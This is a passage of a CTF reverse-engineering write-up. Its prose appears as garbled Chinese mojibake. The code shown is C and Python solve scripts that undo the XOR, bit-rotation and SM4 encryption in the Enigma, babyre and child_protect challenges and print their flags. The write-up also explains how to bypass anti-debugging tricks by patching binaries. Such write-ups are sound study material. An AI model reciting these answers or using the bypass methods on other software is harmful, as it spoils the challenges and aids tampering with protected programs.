class="number">31</span>, <span class="number">195</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">110</span>, <span class="number">214</span>, <span class="number">206</span>, <span class="number">97</span>, <span class="number">187</span>, <span class="number">143</span>, <span class="number">183</span>, <span class="number">243</span>, <span class="number">16</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">69</span>, <span class="number">158</span>, <span class="number">252</span>, <span class="number">225</span>, <span class="number">177</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">140</span>, <span class="number">229</span>, <span class="number">31</span>, <span class="number">147</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">168</span>, <span class="number">84</span>, </span><br><span class="line">  <span class="number">225</span>, <span class="number">181</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">251</span>, <span class="number">202</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor2[] = &#123;<span class="number">236</span>, <span class="number">251</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">249</span>, <span class="number">231</span>,</span><br><span class="line"> <span class="number">139</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">63</span>, <span class="number">80</span>, <span class="number">130</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">68</span>, <span class="number">43</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ans[] = &#123;<span class="number">192</span>, <span class="number">92</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">127</span>, <span class="number">219</span>,</span><br><span class="line"> <span class="number">63</span>, <span class="number">77</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">254</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">227</span>, <span class="number">85</span>, <span class="number">38</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mem[i] ^= xor1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">op1[i] ^= op2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] ^= xor2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#02x"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç§»ä½è¿˜åŸï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">16</span>] = &#123;<span class="number">0x2c</span>, <span class="number">0xa7</span>, <span class="number">0x73</span>, <span class="number">0xe</span>, <span class="number">0x86</span>, <span class="number">0x3c</span>, <span class="number">0xb4</span>, <span class="number">0x5f</span>,</span><br><span class="line"> <span class="number">0x8f</span>, <span class="number">0x87</span>, <span class="number">0xae</span>, <span class="number">0x91</span>, <span class="number">0xf7</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0xd</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">flag[<span class="number">15</span>] = (a[<span class="number">15</span>] &lt;&lt; <span class="number">3</span>) | ((a[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = (a[i] &lt;&lt; <span class="number">3</span>) | ((a[i+<span class="number">1</span>] &gt;&gt; <span class="number">5</span>)&amp;<span class="number">7</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x"</span>, flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>ç¨‹åºå–å‡ºinpæ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œç„¶åè¿›è¡ŒåŠ å¯†åä»¥hexå½¢å¼å­˜æ”¾å…¥encæ–‡ä»¶ã€‚</p><p>å…³é”®å°±æ˜¯å…¶ä¸­çš„ä¸€ä¸ªåè°ƒè¯•ï¼š</p><p><img src="https://i.loli.net/2021/02/03/QJ1RZLqFW6Axti7.png" alt="image-20210202194810695"></p><p>é¦–å…ˆ<strong>SetUnhandledExceptionFilter</strong>å‡½æ•°çš„ä½œç”¨ï¼šè®¾ç½®é¡¶å±‚æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨ï¼ˆtop-level unhandled exception filterï¼‰ï¼Œæ•è·è¿›ç¨‹çš„å„ä¸ªçº¿ç¨‹ä¸­ä¸€åˆ‡æœªè¢«å¤„ç†çš„ç»“æ„åŒ–å¼‚å¸¸ã€‚ç®€å•æ¥è¯´å°±æ˜¯ä¿®æ”¹ç³»ç»Ÿæœ€åçš„å¼‚å¸¸å¤„ç†å™¨ã€‚</p><p>ç„¶åè§¦å‘<strong>SetUnhandledExceptionFilter</strong>çš„æ¡ä»¶ï¼š</p><ul><li>ç¨‹åºä¸­æœ‰å¼‚å¸¸ï¼Œä½†æ²¡æœ‰ç›¸åº”çš„æ“ä½œæ“ä½œå»å¤„ç†è¯¥å¼‚å¸¸ã€‚</li><li>ç¨‹åºä¸å¤„äºè°ƒè¯•çŠ¶æ€ã€‚</li></ul><p><img src="https://i.loli.net/2021/02/03/qx619Tjh8yLIrHW.png" alt="image-20210202195228226"></p><p>æ»¡è¶³æ¡ä»¶åç¨‹åºå°†æ‰§è¡Œè®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°æ¥å¤„ç†è¯¥å¼‚å¸¸ã€‚</p><blockquote><p>è€Œä¸€èˆ¬ç¨‹åºä¸­è¦ä¹ˆæŠŠè®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°ç”¨æ¥æ£€æµ‹ç¨‹åºæ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ï¼›è¦ä¹ˆéšè—ç¨‹åºçš„å…³é”®ä»£ç ï¼Œè®©æˆ‘ä»¬æ‰§è¡Œä¸åˆ°ã€‚</p></blockquote><p>å¯¹äºè§¦å‘<strong>SetUnhandledExceptionFilter</strong>çš„æ¡ä»¶ï¼Œä¸€èˆ¬ç¨‹åºåœ¨è°ƒç”¨<strong>SetUnhandledExceptionFilter</strong>åä¼šæœ‰æ•…æ„è§¦å‘å¼‚å¸¸çš„ä»£ç ï¼Œæœ¬é¢˜å°±æ˜¯é åé¢çš„æ‰§è¡Œæ— æ•ˆæŒ‡ä»¤è¿›è¡Œè§¦å‘ã€‚è€Œç¨‹åºæ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€å…¶å®æ˜¯è‹¥å‡ºç°çš„å¼‚å¸¸ä¼ é€’ç»™äº†ç¨‹åºï¼Œç¨‹åºå…ˆè°ƒç”¨UnhandledExceptionFilterï¼Œè€ŒUnhandledExceptionFilteré‡Œé¢åˆè°ƒç”¨äº†<strong>ZwQueryInformationProcess</strong>è¿›è¡Œåè°ƒè¯•æ£€æµ‹ï¼Œè®¾ç½®æ”¹å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º7ï¼Œçœ‹æ‰§è¡Œå®Œè¯¥å‡½æ•°åç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å‘çš„ç¼“å†²åŒºæ˜¯å¦ä¸º0ï¼Œè‹¥ä¸ä¸º0åˆ™ç¨‹åºå¤„äºè°ƒè¯•çŠ¶æ€ï¼Œå…¶å®å°±æ˜¯çœ‹æœ‰æ²¡æœ‰è°ƒè¯•ç«¯å£ã€‚</p><p>ç¨‹åºè½½å…¥ODï¼Œè®¾ç½®å¿½ç•¥å¼‚å¸¸ï¼Œctrl+gï¼Œè¾“å…¥å‡½æ•°åå­—æ¥åˆ°<strong>ZwQueryInformationProcess</strong>å‡½æ•°ï¼Œç„¶åä¸‹æ–­ã€‚</p><p><img src="https://i.loli.net/2021/02/03/W1ubcV5jJ9lResL.png" alt="image-20210202202155455"></p><p>ä»æ ˆçª—å£çœ‹åˆ°ç¬¬2ä¸ªå‚æ•°ä¸º7ï¼Œé‚£å°±æ˜¯è¦æ‰¾çš„äº†ï¼Œå›æº¯åˆ°è°ƒç”¨å¤„ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œåå°†ç›¸åº”çš„ç¼“å­˜åŒºçš„å€¼æ”¹ä¸º0å³å¯ï¼ˆè‹¥ç¨‹åºå¤šæ¬¡å‡ºç°è¿™ç§è§¦å‘å¼‚å¸¸çš„è·³è½¬ï¼Œé‚£æˆ‘ä»¬ç®€å•åœ¨æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åhookä¸€ä¸‹ç¨‹åºæ–¹ä¾¿äº›ï¼Œæœ¬é¢˜çš„è¯ç›´æ¥æŠŠåé¢çš„jeæ”¹ä¸ºjmpå°±å¥½äº†ï¼‰ã€‚ç»§ç»­æ‰§è¡Œï¼Œå°±åˆ°äº†æˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‡½æ•°äº†ã€‚</p><p><img src="https://i.loli.net/2021/02/03/hT5x1sSw6Nlq7YJ.png" alt="image-20210202205950723"></p><p>è€Œæˆ‘åšæœ¬é¢˜çš„æ—¶å€™å¹¶æ²¡æœ‰å»è¿‡è¿™ä¸ªåè°ƒè¯•ï¼Œä½¿ç”¨çš„é™„åŠ è°ƒè¯•ï¼Œç„¶åç®€å•è°ƒè¯•äº†ä¸‹é‚£ä¸ªè®¾ç½®ä¸ºå¼‚å¸¸å¤„ç†çš„å‡½æ•°ï¼Œå‘ç°åé¢è¿˜è¦è§¦å‘å¼‚å¸¸å°±å¼€å§‹é™æ€åˆ†æã€‚</p><p>é¦–å…ˆæ‰¾åˆ°å¼•ç”¨æœ€åå­˜æ”¾åŠ å¯†æ•°æ®æ•°ç»„çš„åœ°æ–¹ï¼šå¾ˆæ˜æ˜¾å®ƒä¸Šä¸‹å…¶å®æ˜¯ä»£ç çš„ã€‚</p><p><img src="https://i.loli.net/2021/02/03/9Lk3baYopKPJzem.png" alt="image-20210202203529519"></p><p>æ‰‹åŠ¨è½¬åŒ–ä¸€ä¸‹ä¸Šé¢çš„æ•°æ®ä¸ºä»£ç ï¼ŒåŠ ä¸Šä¹‹å‰è°ƒè¯•äº†ä¸‹è®¾ç½®å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œç„¶åå¾ˆå®¹æ˜“å‘ç°ï¼Œä»£ç ä¸­æœ‰å¾ˆå¤šç”¨æ¥è§¦å‘å¼‚å¸¸çš„æ•°æ®ï¼ˆ0x0c7, 0xffï¼Œä¸”åé¢è·Ÿç€2ä¸ªæˆ–3è¿™æ“ä½œæ•°ï¼‰ã€‚</p><p>åˆåœ¨åˆ†æå¾ªç¯ä»£ç æ˜¯å‘ç°å¾ªç¯è®¡æ•°å™¨æ¯æ¬¡æ²¡æœ‰å˜ï¼Œé‚£å²‚ä¸æ— é™å¾ªç¯ï¼Œä»è¿™é‡Œåˆè¿›è€Œå‘ç°ï¼Œç¨‹åºæ¯æ¬¡è§¦å‘å¼‚å¸¸è·³åˆ°è®¾ç½®çš„å¼‚å¸¸å¤„ç†å‡½æ•°çš„ç›®çš„ï¼šè·å–å½“å‰çš„eipï¼Œä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œä¿®æ”¹eipã€‚</p><p>å„ç§opcodeçš„åŠŸèƒ½ï¼š</p><p><img src="https://i.loli.net/2021/02/03/iTCalzSyQhYwrvV.png" alt="image-20210202204604400"></p><p><img src="https://i.loli.net/2021/02/03/fsUpTmPy41KqxXt.png" alt="image-20210202204621359"></p><p>å‰©ä¸‹çš„æŠŠç›¸åº”çš„è§¦å‘å¼‚å¸¸çš„ä»£ç æ›¿æ¢ä¸ºå®é™…çš„æ“ä½œï¼Œå› ä¸ºåŠ å¯†ä¸å¤æ‚ï¼Œç›´æ¥çœ‹æ±‡ç¼–ä»£ç åˆ†æä¸‹å°±å¥½äº†ã€‚</p><p>é¦–å…ˆä¸€ä¸ªé€šè¿‡æŒ‡å®šçš„indexè¿›è¡Œä¸€ä¸ªç½®æ¢æ“ä½œï¼Œç„¶åå…¸å‹çš„ç§»ä½æˆ–åŠ å¯†ï¼Œæœ€åä¸€ä¸ªå¼‚æˆ–ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ind[<span class="number">50</span>], ans[<span class="number">50</span>], tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] = &#123;<span class="number">147</span>, <span class="number">139</span>, <span class="number">143</span>, <span class="number">67</span>, <span class="number">18</span>, <span class="number">104</span>, <span class="number">247</span>,</span><br><span class="line"> <span class="number">144</span>, <span class="number">122</span>, <span class="number">75</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">180</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">104</span>,</span><br><span class="line"> <span class="number">203</span>, <span class="number">25</span>, <span class="number">252</span>, <span class="number">248</span>, <span class="number">178</span>, <span class="number">107</span>, <span class="number">196</span>, <span class="number">171</span>, <span class="number">200</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"Bier"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp += <span class="number">0x11</span>;</span><br><span class="line">tmp &amp;= <span class="number">0x1f</span>;</span><br><span class="line">ind[i] = tmp;</span><br><span class="line"><span class="comment">//printf("%02x ", tmp);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= key[i&amp;<span class="number">0x3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc[i] ^= enc[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">0</span>] = (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) | (enc[<span class="number">31</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] = (enc[i] &gt;&gt; <span class="number">3</span>) | (enc[i<span class="number">-1</span>] &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*for(i = 0; i &lt; 32; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">printf("%02x ", ans[i]);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[ind[i+<span class="number">1</span>]] = ans[ind[i]];</span><br><span class="line">flag[ind[i]] = ans[ind[i+<span class="number">1</span>]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</span></span><br></pre></td></tr></table></figure><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>æ‹¿äº†äºŒè¡€ã€‚</p><p>ç¨‹åºå…¶å®åˆ©ç”¨è°ƒç”¨å·hookäº†ç³»ç»Ÿè°ƒç”¨r3åˆ°r0çš„è½¬æ¥å±‚ï¼Œæ‰€ä»¥ä»ä¸‹å›¾ä¸­çš„v11å‡½æ•°æŒ‡é’ˆå…¶å®æ˜¯å»æ‰§è¡Œå‡ºé¢˜äººè‡ªå·±è®¾ç½®çš„å‡½æ•°ã€‚</p><p><img src="https://i.loli.net/2021/02/03/ofAZ4YKhuGjDcR8.png" alt="image-20210202211546712"></p><p>ç®€å•è·Ÿè¿›è¡Œä¸€ä¸‹v11æŒ‡å‘çš„å‡½æ•°ï¼šå¼€å§‹å¯¹å­—ç¬¦è§£å¯†å¾—åˆ°æ¨¡å—å’Œå‡½æ•°åï¼Œå°±æ˜¯ä¸ºäº†å¾—åˆ°å‡½æ•°<strong>NtSetInformationThread</strong>æ¥è¿›è¡Œåè°ƒè¯•ã€‚</p><p><img src="https://i.loli.net/2021/02/03/nph5lyftBDePWmZ.png" alt="image-20210202212312718"></p><p>å¯¹äºè¿™ä¸ªåè°ƒè¯•ä¹‹å‰æ€»ç»“è¿‡ï¼š</p><p><img src="https://i.loli.net/2021/02/03/MxtYpIG8fNWUDyh.png" alt="image-20210202212558373"></p><p>è¿™é‡Œè¦è¿‡å®ƒç›´æ¥patchæ‰å°±å¥½äº†ã€‚</p><p>ç„¶åå°±æ˜¯ä¸€äº›åŠ è½½dllå’Œå‡½æ•°ä»£ç è§£å¯†ç›¸å…³çš„æ“ä½œï¼Œåšé¢˜æ—¶èŠ‚çœæ—¶é—´æ²¡ç®¡ï¼Œç°åœ¨è¿˜æ˜¯çœ‹çœ‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/KdMh8I6VLunaZJC.png" alt="image-20210202213212377"></p><p>ä½¿ç”¨èµ„æºæŸ¥çœ‹å·¥å…·ï¼Œæ‰¾åˆ°ç¨‹åºèµ„æºä¸­æ”¹dllï¼Œæ˜æ˜¾çœ‹åˆ°æ˜¯éœ€è¦è¿›è¡Œè§£å¯†çš„ï¼Œä¹Ÿå°±æ˜¯åé¢çš„æ“ä½œã€‚</p><p><img src="https://i.loli.net/2021/02/03/t7HSrVNwjb9qZBJ.png" alt="image-20210202213458322"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œçœ‹åˆ°è§£å¯†æ“ä½œåªæ˜¯ä¸€ä¸ªå¼‚æˆ–ï¼š<br><img src="https://i.loli.net/2021/02/03/ysgJIf6lP5uRk1i.png" alt="image-20210202213645891"></p><p>è‡³äºåé¢çš„æ“ä½œå°±æ˜¯å¾—åˆ°ç›¸å…³çš„å‡½æ•°åœ°å€ç­‰ã€‚</p><p>æœ€åè·Ÿåˆ°æœ€åçš„åŠ å¯†å‡½æ•°ï¼šå­—ç¬¦ä¸²å°±æç¤ºäº†sm4å¯†ç ï¼Œä¸”é•¿åº¦æ˜¯16ï¼Œé‚£è¿™ä¸ªå°±æ˜¯keyäº†ã€‚sm4å¯†ç ä»å¸¸é‡0xA3B1BAC6ä¹Ÿå¯ä»¥è¯†åˆ«å‡ºæ¥ã€‚</p><p><img src="https://i.loli.net/2021/02/03/UFJ7TvwXNgWRxt4.png" alt="image-20210202214023629"></p><p>è¿™é‡ŒæŠŠ32çš„inputåˆ†2æ¬¡åŠ å¯†çš„ï¼Œæ¯æ¬¡16ä½ã€‚ä½¿ç”¨å¯†æ–‡è§£å¯†ä¸€ä¸‹å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = bytes([<span class="number">234</span>,  <span class="number">99</span>,  <span class="number">88</span>, <span class="number">183</span>, <span class="number">140</span>, <span class="number">226</span>, <span class="number">161</span>, <span class="number">233</span>, <span class="number">197</span>,  <span class="number">41</span>, </span><br><span class="line">  <span class="number">143</span>,  <span class="number">83</span>, <span class="number">232</span>,   <span class="number">8</span>,  <span class="number">50</span>,  <span class="number">89</span>, <span class="number">175</span>,  <span class="number">27</span>, <span class="number">103</span>, <span class="number">174</span>, </span><br><span class="line">  <span class="number">217</span>, <span class="number">218</span>, <span class="number">207</span>, <span class="number">196</span>, <span class="number">114</span>, <span class="number">255</span>, <span class="number">177</span>, <span class="number">236</span>, <span class="number">118</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">6</span>])</span><br><span class="line">key = <span class="string">b'Ez_5M4_C1pH@r!!!'</span></span><br><span class="line">key = bytes_to_long(key)</span><br><span class="line">c1 = bytes_to_long(c[<span class="number">0</span>:<span class="number">16</span>])</span><br><span class="line">c2 = bytes_to_long(c[<span class="number">16</span>:<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">flag1 = decrypt(c1, key)</span><br><span class="line">flag2 = decrypt(c2, key)</span><br><span class="line">flag = long_to_bytes(flag1)+long_to_bytes(flag2)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#42b061b4cb41cfa89ca78047bde1856e</span></span><br></pre></td></tr></table></figure><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>æ‹¿äº†äºŒè¡€ã€‚ã€‚</p><p>ä»é¢˜ç›®åå­—å°±æƒ³åˆ°è€ƒç‚¹å¯èƒ½æ˜¯ç¨‹åºè‡ªæˆ‘åˆ›å»ºåè°ƒè¯•ï¼Œå‡çº§ä¸€ç‚¹å°±æ˜¯Debug BlockeræŠ€æœ¯ã€‚å°è¯•ä¸‹äº†æ–­ç‚¹ï¼Œå‘ç°ä¸ä¼šæ–­ä¸‹ã€‚ç„¶åä½¿ç”¨</p><p>procexpæŸ¥çœ‹ç¨‹åºï¼šæœç„¶ï¼Œæ­£å¦‚é¢˜ç›®åå­—ã€‚</p><p><img src="https://i.loli.net/2021/02/03/NFq5Iep92wZAPGv.png" alt="image-20210202222147793"></p><blockquote><p><strong>Debug BlockeræŠ€æœ¯ç‰¹ç‚¹ï¼š</strong></p><ul><li><strong>è°ƒè¯•å™¨ä¸è¢«è°ƒè¯•å™¨å…³ç³»ä¸­ï¼Œè°ƒè¯•è¿›ç¨‹ä¸è¢«è°ƒè¯•è¿›ç¨‹é¦–å…ˆæ˜¯ä¸€ç§çˆ¶å­å…³ç³»ã€‚</strong></li><li><strong>å­è¿›ç¨‹è¿›ç¨‹å·²ç»è¢«è°ƒè¯•ï¼Œä¸èƒ½åœ¨è¢«å…¶ä»–è°ƒè¯•å™¨è°ƒè¯•</strong></li><li><strong>å¼ºåˆ¶ç»ˆæ­¢è°ƒè¯•è¿›ç¨‹ä»¥åˆ‡æ–­è°ƒè¯•å™¨-è¢«è°ƒè¯•å™¨å…³ç³»æ—¶ï¼Œè¢«è°ƒè¯•è¿›ç¨‹ä¹Ÿä¼šåŒæ—¶ç»ˆæ­¢ã€‚</strong></li><li><strong>çˆ¶è¿›ç¨‹æ“ä½œè¢«å­è¿›ç¨‹çš„ä»£ç </strong></li><li><strong>çˆ¶è¿›ç¨‹å¤„ç†è¢«å­è¿›ç¨‹ä¸­å‘ç”Ÿçš„å¼‚å¸¸</strong></li></ul></blockquote><p>æ¥åˆ°creatprocesså‡½æ•°çš„åœ°æ–¹çœ‹çœ‹ï¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ªäº’æ–¥ä½“ï¼Œç›®çš„æ˜¯ä¸ºäº†åŒºåˆ«å½“å‰è¿è¡Œçš„æ˜¯å­è¿›ç¨‹è¿˜æ˜¯çˆ¶è¿›ç¨‹ï¼Œè¿›è€Œæ‰§è¡Œä¸åŒçš„åˆ†æ”¯ã€‚æ¥ä¸‹æ¥åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ã€‚<br><img src="https://i.loli.net/2021/02/03/dtHyc9rBTIlAVXu.png" alt="image-20210202222344171"></p><p><img src="https://i.loli.net/2021/02/03/AUKzcsI8Wl6R1Sx.png" alt="image-20210202223940336"></p><p>ç„¶åå°±æ˜¯å­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹äº¤äº’çš„è¿‡ç¨‹ï¼š<br><img src="https://i.loli.net/2021/02/03/Gykoqiu7s1fL3Zg.png" alt="image-20210202224313171"></p><p>å…·ä½“äº¤äº’è¿‡ç¨‹ï¼šå¯ä»¥çœ‹åˆ°å°±2ä¸ªï¼Œé‚£æˆ‘ä»¬ä¸ç”¨æŠŠç¨‹åºè°ƒè¯•èµ·æ¥ï¼Œç›´æ¥æ‰‹åŠ¨æˆ–idapythonä¿®æ”¹å­è¿›ç¨‹å°±è¡Œäº†ã€‚</p><p><img src="https://i.loli.net/2021/02/03/sFOHkW1pPUYeGQJ.png" alt="image-20210202224637602"></p><p>ç¬¬ä¸€ä¸ªå°±å½“ä½œèŠ±æŒ‡ä»¤å¤„ç†nopæ‰å¤šä½™ä»£ç ï¼Œå¯¹äºç¬¬äºŒä¸ªï¼šå…¶å®å°±æ˜¯æŠŠå‡½æ•°ä¸­çš„0x8e32cdaaä¿®æ”¹ä¸º0x73FF8CA6ã€‚</p><p><img src="https://i.loli.net/2021/02/03/zM9IE7ajLCnZOJW.png" alt="image-20210202225101786"></p><p>æŠŠä¿®å¤å¥½çš„ä»£ç åç¼–è¯‘ï¼š</p><p><img 